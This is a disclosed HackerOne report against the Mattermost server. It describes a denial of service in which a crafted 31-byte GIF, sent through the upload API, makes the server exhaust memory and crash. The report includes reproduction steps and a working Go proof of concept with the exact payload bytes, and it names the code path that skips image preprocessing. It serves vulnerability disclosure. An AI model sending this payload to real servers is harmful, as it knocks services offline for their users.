# DOS: out of memory from gif through upload api

## Report Details
- **Report ID**: 1620170
- **URL**: https://hackerone.com/reports/1620170
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-06-30T09:41:37.544Z
- **Disclosed**: 2022-09-21T08:49:00.175Z

## Reporter
- **Username**: catenacyber
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mattermost

## Vulnerability Information
## Summary:
When sending a specially crafted gif with max dimensions through the upload API, we get Mattermost server to consume more than 4Gbytes of RAM

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Run `docker run --name mattermost-preview -d --publish 8065:8065 mattermost/mattermost-preview -m=4G` as documented https://docs.mattermost.com/guides/deployment.html with 4G limit from https://docs.mattermost.com/install/software-hardware-requirements.html#hardware-requirements-for-team-deployments
  1. Get one channel id
  1. Run this simple POC below with a valid channel id
  1. Docker container gets killed

```
package main

import (
	"bytes"
	"fmt"
	"github.com/mattermost/mattermost-server/v5/model"
)

func main() {
	Client := model.NewAPIv4Client("http://localhost:8065/")
	Client.Login("toto", "tototo")
	us := &model.UploadSession{
		ChannelId: "5dtj9hf89ifap8imigbzjc7wjo",
		Filename:  "oom.gif",
		FileSize:  31,
	}
	us, response := Client.CreateUpload(us)
	fmt.Printf("lol %s %#+v\n", us, response)
	data := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x2e, 0xf8, 0xff, 0xff, 0xf, 0x18, 0x18, 0x2c, 0x7f, 0x20, 0x0, 0x0, 0x0, 0xa0, 0xff, 0xff, 0xff, 0xd4, 0x9a, 0xf0, 0xb4, 0x8, 0x35, 0x4, 0x0}
	info, err2 := Client.UploadData(us.Id, bytes.NewReader(data))
	fmt.Printf("lol %s %#+v\n", err2, info)
}
```

This happens with `gif.DecodeAll` being called by `GetInfoForBytes` getting called by `App.UploadData` being called by `doUploadData` being called by `uploadData` without any call to `preprocessImage` as is done in the `api/v4/files` route

Docker container gets killed

## Impact

Crash a server

## Attachments
No attachments
